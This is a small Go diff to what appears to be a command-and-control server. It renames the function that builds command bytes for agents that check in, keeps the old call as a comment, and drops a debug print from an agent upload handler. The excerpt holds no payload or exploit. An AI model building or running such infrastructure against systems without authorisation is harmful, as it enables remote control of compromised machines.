@@ -52,14 +52,22 @@ func (h *AgentHandler) AgentCheckInHandler(w http.ResponseWriter, r *http.Reques
 		return
 	}
 
-	cmdBytes, err := bytemgr.CraftCmdBytes(data, h.FileMgr)
+	cmdBytes, err := bytemgr.CraftAgentResponse(data, h.FileMgr)
 	if err != nil {
 		fmt.Println(err)
-
 		w.WriteHeader(http.StatusInternalServerError)
 		w.Write([]byte("0"))
 		return
 	}
+
+	// cmdBytes, err := bytemgr.CraftCmdBytes(data, h.FileMgr)
+	// if err != nil {
+	// 	fmt.Println(err)
+
+	// 	w.WriteHeader(http.StatusInternalServerError)
+	// 	w.Write([]byte("0"))
+	// 	return
+	// }
 
 	w.WriteHeader(http.StatusOK)
 	w.Write(cmdBytes)
@@ -67,7 +75,6 @@ func (h *AgentHandler) AgentCheckInHandler(w http.ResponseWriter, r *http.Reques
 }
 
 func (h *AgentHandler) AgentUploadHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Println("POST HIT")
 	AgentGuid := r.Header.Get("X-Agent-ID")
 	fmt.Println(AgentGuid)
 	Host := r.Host
